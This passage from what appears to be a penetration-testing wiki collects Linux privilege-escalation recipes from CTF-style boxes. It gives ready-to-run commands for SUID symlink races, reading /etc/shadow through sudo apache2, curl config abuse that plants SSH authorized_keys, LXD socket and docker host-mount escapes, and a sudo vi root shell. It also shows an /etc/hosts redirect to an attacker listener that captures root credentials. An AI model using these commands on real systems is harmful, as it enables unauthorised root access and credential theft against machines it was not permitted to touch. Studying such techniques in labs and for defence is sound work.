Beyond the OS-level primitives above, a specific installed application can carry its own root-run
privesc path:

- [[logstash-privesc]] — Logstash pipeline/config abuse for root (runs as root by default on many installs).
- [[splunk-lpe-persistence]] — Splunk forwarder/app-deployment local privesc and persistence.
- [[node-cef-debugger-abuse]] — Node.js `--inspect` and CEF/Chromium (Electron) debugger-port abuse for RCE/privesc.
- [[freeipa-pentesting]] — FreeIPA (Kerberos+LDAP identity management, the AD-equivalent on Linux) enumeration and lateral movement/privesc.

## SUID TOCTOU file-race (check-then-use)

A SUID/SGID binary that VALIDATES a path (a symlink check, an `access()` permission check, or a
name check) and then OPENS or reads it in a SEPARATE later step has a time-of-check/time-of-use
race: swap the path to a symlink pointing at the protected target between the check and the use, so
the check passes on a benign file but the privileged `open()` follows the symlink and reads the
target as the binary's euid. Read the SUID binary's source (if available) to find the check-then-use
gap; the window is the code between the check and the `open()`/`read()`.

**Pattern A - symlink / name check bypass.** Binary does `lstat`+`S_ISLNK` (or `strstr(path,"secret")`)
then, later, `open(path)`. Pass a plain file (or a name without the banned substring) that passes the
check, then swap it to a symlink pointing at the target before the open:
```sh
mkdir /tmp/w && cd /tmp/w && touch x               # plain file: passes lstat / name checks
( sleep 1; rm -f x; ln -sf /target/secret x ) &    # swap to symlink during the window
<suid-binary> /tmp/w/x                             # open() follows the symlink as euid
```
If the binary blocks on input (a `getchar`/prompt) between check and use, the window is
human-timed: swap the file, then send the input. A tight window needs a fast flip loop instead.

**Pattern B - `access()` / `open()` TOCTOU.** `access(path, R_OK)` checks against the caller's REAL
uid, but `open()` runs with the euid (the SUID owner). Flip the path between a file the real user can
read (passes `access`) and a symlink to a file only the euid can read, racing many runs so `access`
sees the readable file and `open` (a moment later) sees the target:
```sh
cd /tmp/r && touch reg
( while true; do rm -f x; ln -f reg x; rm -f x; ln -sf /target/secret x; done ) &   # flip loop
while true; do <suid-binary> /tmp/r/x | grep -q FOUND && break; done                # race it
```
A `sleep`/`usleep` between the `access` and the `open` widens the window and makes it easy to win.

**Gotcha - `fs.protected_symlinks`.** The sysctl (default `1`) refuses to follow a symlink inside a
world-writable STICKY dir (`/tmp`, `/dev/shm`) when the follower's euid differs from the symlink's
owner, so a classic `/tmp` symlink race fails with EACCES (`open` returns -1) even when the swap
timing is correct. Put the symlink in a race-owned, NON-world-writable subdir (`mkdir /tmp/sub`,
mode 755): the protection only applies to sticky world-writable dirs, so the privileged binary
follows it.

**Concurrency variant - unsynchronized shared state.** A threaded service that checks a gate
(`if (counter >= N)`) against a global mutated by other requests WITHOUT a lock is racy: flood
concurrent requests that raise the counter so it stacks past the gate before any per-request reset,
then race the gated action in the same window. Drive it with a THREADED client (e.g. Python
threads); a bash `/dev/tcp` connection flood fork-bombs your own session.

<!-- promoted-slug: suid-toctou-file-race -->

## sudo apache2/httpd -> read root-only files via config-parse leak

With `(ALL) NOPASSWD: /usr/sbin/apache2` (or `httpd`), `apache2 -f <file>` parses the file as a
config; a line that is not a valid directive raises `AH00526: Syntax error ... Invalid command
'<line>'`, echoing the file's content back as root. Pointing `-f` straight at the target fails early
with "No MPM loaded" - the config must first `LoadModule` an MPM, then `Include` the target so the
parse reaches (and leaks) its content:
```
printf 'LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so\nServerName x\nInclude /root/root.txt\n' > /tmp/ac
sudo /usr/sbin/apache2 -f /tmp/ac
# -> Invalid command 'THM{...}' / first line of /etc/shadow, etc.
```
Swap the MPM path/name for the distro's (`mod_mpm_prefork.so`, `mpm_prefork_module`). Reads any
root-readable file (`/etc/shadow`, SSH keys, flags). Same idea works with an Apache config that sets
`DocumentRoot /` + a permissive `<Directory>` to serve the whole filesystem over HTTP as root.

<!-- promoted-slug: sudo-apache2-fileread -->

## sudo curl with a restricted URL -> arbitrary file read/write via `-K` config

Sudoers like `(user) /usr/bin/curl 127.0.0.1/*` looks locked to one host, but curl's config-file
option escapes it. Two rules matter: the URL must be the **FIRST** argument (any flag before it
fails the sudoers match, `Sorry, ... not allowed`), and **trailing** flags ARE allowed. A trailing
`-K <file>` loads a curl config (world-readable, written as the low-priv user) that supplies
arbitrary `url`/`output`, so you act with the target user's privileges.

Read any file as the target user (the file content follows the throwaway `127.0.0.1/` response on
stdout - strip the HTML):
```
printf 'url = "file:///path/to/secret"\n' > /tmp/uc
sudo -u <user> /usr/bin/curl 127.0.0.1/ -s -K /tmp/uc
```

Write any file as the target user - put `output` **before** `url` in the config so it pairs with the
`file://` transfer, give the command-line url its own `-o /dev/null`, and `create-dirs` makes parents.
Classic use: plant `authorized_keys` for an SSH shell as the target user:
```
printf 'create-dirs\noutput = "/home/<user>/.ssh/authorized_keys"\nurl = "file:///tmp/mypub"\n' > /tmp/wcfg
sudo -u <user> /usr/bin/curl 127.0.0.1/ -o /dev/null -K /tmp/wcfg
```

Generalizes to any `sudo curl` whose URL/host is constrained: the `-K` config (or `-o` write, `file://`
read) is the primitive; the sudoers pattern only limits the first argument.

<!-- promoted-slug: sudo-curl-k-gadget -->

### LXD-group gotcha: snap `lxc` CLI dies on a broken passwd home — use the socket API

On snap-based LXD (`/snap/bin/lxc`), the `lxc` client refuses to run if the invoking user's passwd
home dir does not exist / is not creatable: `WARNING: cannot create user data directory: cannot
create snap home dir: mkdir /home/<user>` then it aborts. snapd derives the home from the passwd
entry via getpwuid and IGNORES `$HOME` — `HOME=/tmp/x lxc ...` does NOT fix it, and `/home` is
usually root-owned so you cannot create the missing dir. This blocks the classic lxc-CLI privesc.

Fallback: drive the LXD REST API directly over the unix socket (the `lxd` group grants access to
`srw-rw---- root:lxd /var/snap/lxd/common/lxd/unix.socket`), bypassing the snap CLI entirely:

```bash
# raw HTTP over the socket (curl, or a python socket if curl is absent):
curl -s --unix-socket /var/snap/lxd/common/lxd/unix.socket a/1.0/instances
# then POST /1.0/images (upload alpine tarball), POST /1.0/instances with
# security.privileged=true + a disk device source=/ path=/mnt/root, start, and exec.
```
Still needs an image (build with lxd-alpine-builder and push, or a remote pull if the box has
internet). If a simpler root exists (a plain `sudo <bin>` GTFOBin, a SUID), prefer it over this.

<!-- promoted-slug: lxd-snap-broken-home -->

### sudo NOPASSWD binary with `(ALL : !root)` — plain GTFOBins form first on patched sudo

When `sudo -l` shows a group-restricted rule like `(ALL : !root) NOPASSWD: /usr/bin/vi`, the working
escalation on MODERN sudo (>= 1.8.28) is the PLAIN GTFOBins form with NO runas flags:

```bash
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null   # runs as root:root, matches (ALL : !root) => root shell
```

Do NOT reach for runas variants first — on a `(ALL : !root)` rule they all fail, and thrashing through
them wastes many attempts:
- `sudo -u#-1 <bin>` (CVE-2019-14287) is PATCHED on sudo >= 1.8.28: fails with `sudo: unknown user: #-1`.
- `sudo -g <grp> <bin>` runs as the INVOKING user with that group (uid unchanged, NOT root).
- `sudo -u root -g <grp> <bin>` prompts for the user's password (that runas is not the NOPASSWD match).

The `!root` restricts the runas GROUP only when `-g` is explicitly passed; a bare `sudo <bin>` defaults
to root:root and is allowed. Always `sudo --version` first: `-u#-1` is only a fallback on sudo < 1.8.28.

<!-- promoted-slug: sudo-nopasswd-plain-form -->

### `find -writable` false positive: masked systemd units

`find / -writable` FOLLOWS SYMLINKS, and a *masked* systemd unit is a symlink to `/dev/null`,
which is world-writable. So a hardened box reports a pile of apparently writable root-owned
units:

```
/usr/lib/systemd/system/sudo.service
/usr/lib/systemd/system/hwclock.service
/usr/lib/systemd/system/rc.service
```

None of these is a privesc. Confirm before building an exploit around one:

```sh
ls -la /usr/lib/systemd/system/<unit>.service     # lrwxrwxrwx ... -> /dev/null  = masked, dead end
systemctl status <unit>.service                   # "Loaded: masked" confirms it
```

Use `find / -writable -type f` (a symlink to `/dev/null` is not a regular file) or `-xtype f` to
drop them from the sweep.

Related trap on the same class of box: a missing `sudo` binary does not mean sudo is unreachable
(`/snap/core20/*/usr/bin/sudo` is SUID root and squashfs is mounted `nodev` but **not** `nosuid`),
and a missing `/usr/bin/sudo` with a dangling `sudoedit` symlink is a deliberate signal that the
intended path is elsewhere. Version-check before reaching for Baron Samedit: `sudoedit -s '\'`
printing the usage message means it is patched.

### `ssh root@` failing is not proof the root password is wrong

`PermitRootLogin no` (the Ubuntu default) rejects a correct root password over SSH, so a password
spray that tests only SSH produces a false negative for root. Always re-test a candidate with
`su` from an existing shell. `su` reads the password from the controlling terminal, so it needs a
PTY - piping into it silently fails:

```python
pid, fd = pty.fork()
if pid == 0:
    os.execv("/bin/su", ["su", "-", "root", "-c", "id"])
# read from fd until "assword", then os.write(fd, pw + b"\n")
```

`script -qc 'su - root' /dev/null` works interactively for the same reason.

<!-- promoted-slug: writable-find-masked-unit-fp -->

### Writable `/etc/hosts` + root job HTTP-fetch → capture root credentials

If `/etc/hosts` is attacker-writable (world-writable, or granted via a POSIX ACL —
check `getfacl /etc/hosts`) AND a root cron/service periodically HTTP-fetches a
**hostname** (not a bare IP), steal root's credentials with no file overwrite or SUID:

1. Confirm the job and its target hostname with [[pspy]] — watch the periodic root
   `curl`/`wget`/HTTP client hitting `http://<name>/...`.
2. Repoint that hostname to your listener: add a `<ATTACKER_IP>  <name>` line to
   `/etc/hosts` (place it after any real entry — last match wins).
3. Serve a page at that path that makes the job **authenticate to you** — a 401 with
   `WWW-Authenticate: Basic`, or a login form the client auto-submits — and log the
   request. The job replays root's stored credentials (Basic-auth header or POST body).
4. Decode the captured `Authorization: Basic` / POST body → root's password; reuse for
   `su` / SSH.

Name resolution, not the HTTP endpoint, is the trust boundary the job relies on; an
`/etc/hosts` write lets you MITM it locally. Find the ACL grant with `getfacl`, the job
with `pspy`. Same idea applies to any root job that resolves a hostname it trusts (pkg
mirror, internal API, license check).

<!-- promoted-slug: writable-etc-hosts-root-fetch-cred-capture -->

## SUID that only `setuid()`s keeps your original groups -> `sg <group>` / `newgrp`

A custom SUID binary doing `setuid(other_uid); execl("/bin/bash", ...)` changes your **UID** to the
target user but does NOT touch your **supplementary groups** (those come from `/etc/group`, set at
login, not from the SUID call). If that target user happens to be a member of a privileged group
(`docker`, `lxd`, `disk`), you already have that group access under your ORIGINAL login groups too —
check first, since a SUID that only calls `setuid()` (no `setgid()`) is a red herring if you already
hold the group.

```bash
id                              # note your existing groups
./suid-binary                   # now uid=<other>, but groups= are UNCHANGED
id                               # confirm: same supplementary groups as before setuid()
groups                           # if docker/lxd is listed, go straight to the socket
sg docker -c 'docker run -v /:/host --rm -it alpine chroot /host sh'   # or: newgrp docker
```

The general check on ANY new shell/user context: `id` again and diff the `groups=` field against
what you had before — a UID change with an unchanged, already-privileged group list is a direct
path to [[linux-container-escape]] without needing the SUID to also flip your GID.

<!-- promoted-slug: suid-setuid-keeps-groups-sg-docker -->
